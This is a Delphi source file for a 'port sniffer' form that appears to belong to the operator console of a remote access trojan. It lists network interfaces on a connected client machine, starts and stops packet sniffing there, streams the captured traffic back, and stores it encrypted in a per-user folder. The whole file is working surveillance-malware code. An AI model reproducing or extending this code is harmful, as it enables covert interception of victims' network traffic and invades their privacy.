unit UnitPortSniffer;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, jpeg, ExtCtrls, acImage, StdCtrls, ComCtrls, ToolWin, UnitMain,
  SocketUnitEx, UnitCommands, UnitFunctions, UnitVariables, UnitRepository,
  UnitConstants, UnitEncryption, UnitManager;

type
  TFormPortSniffer = class(TForm)
    tlb1: TToolBar;
    btn1: TToolButton;
    btn2: TToolButton;
    cbb1: TComboBoxEx;
    mmoSniffer: TMemo;
    btn6: TToolButton;
    btn9: TToolButton;
    btn3: TToolButton;
    pb1: TProgressBar;
    procedure FormShow(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
    Client: TClientDatas;          
    procedure AddLog(Log: string);
    procedure AddSentLog(Log: string);
    procedure AddRecvLog(Log: string; lColor: TColor = clGreen);
  public
    { Public declarations }                  
    constructor Create(aOwner: TComponent; _Client: TClientDatas);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormPortSniffer: TFormPortSniffer;

implementation

{$R *.dfm}
                  
constructor TFormPortSniffer.Create(aOwner: TComponent; _Client: TClientDatas);
begin
  inherited Create(aOwner);
  Client := _Client;
end;

procedure TFormPortSniffer.FormShow(Sender: TObject);
begin
  if cbb1.Items.Count > 0 then Exit;
  Client.SendDatas(PORTSNIFFERINTERFACES + '|');
  AddSentLog('Get interfaces list');
end;
              
procedure TFormPortSniffer.AddLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[INFO]', Log, -1, clBlack);
end;

procedure TFormPortSniffer.AddSentLog(Log: string);
begin
  TFormManager(Client.Forms[16]).AddLog('[SENT]', Log, 0, clBlue);
end;

procedure TFormPortSniffer.AddRecvLog(Log: string; lColor: TColor);
begin
  TFormManager(Client.Forms[16]).AddLog('[RECEIVED]', Log, 1, lColor);
end;

procedure TFormPortSniffer.WndProc(var Msg: TMessage);
var
  MainCommand, Datas: string;
  TmpItem: TListItem;
  TmpStr: string;
begin
  inherited;

  if Msg.Msg = WM_PROCESS_DATAS then
  begin
    Datas := string(Msg.WParam);
    MainCommand := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if MainCommand = PORTSNIFFERINTERFACES then
    begin
      cbb1.Clear;

      pb1.Max := StringCount('|', Datas);
      pb1.Position := 0;

      while Datas <> '' do
      begin
        Application.ProcessMessages;
        pb1.Position := pb1.Position + 1;
        TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
        Delete(Datas, 1, Pos('|', Datas));
        cbb1.Items.Add(TmpStr);
      end;

      cbb1.ItemIndex := 0;
      AddRecvLog(IntToStr(cbb1.Items.Count) + ' interfaces found');
    end
    else

    if MainCommand = PORTSNIFFERRESULTS then
    begin
      mmoSniffer.Text := mmoSniffer.Text + Datas;
      mmoSniffer.SelStart := Length(mmoSniffer.Text);
      SendMessage(mmoSniffer.Handle, EM_SCROLLCARET, 0, 0);
    end;
  end;
end;

procedure TFormPortSniffer.btn1Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
  i: Integer;
begin
  if btn1.Down = True then
  begin
    i := cbb1.ItemIndex;
    TmpStr := cbb1.Items.Strings[i];      
    if TmpStr = '' then Exit;
    TmpStr1 := Copy(TmpStr, 1, Pos(' ', TmpStr) - 1);
    Delete(TmpStr, 1, Pos(' ', TmpStr));
    Delete(TmpStr, 1, Pos('-', TmpStr) + 1);

    mmoSniffer.Clear;
    Client.SendDatas(PORTSNIFFERSTART + '|' + TmpStr1);
    AddSentLog('Start port sniffing on interface ' + TmpStr);
  end
  else
  begin
    Client.SendDatas(PORTSNIFFERSTOP + '|');
    AddSentLog('Stop port sniffing');
  end;
end;

procedure TFormPortSniffer.btn2Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
begin
  TmpStr := GetSnifferFolder(Client.UserId) + '\' + MyGetTime('_') + '.data';
  TmpStr1 := EnDecryptText(mmoSniffer.Text, PROGRAMPASSWORD);
  MyCreateFile(TmpStr, TmpStr1, Length(TmpStr1));
  AddLog('Port sniffer datas saved');
end;

procedure TFormPortSniffer.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  if btn1.Down then
  begin
    btn1.Down := False;
    btn1Click(Sender);
  end;
end;

end.
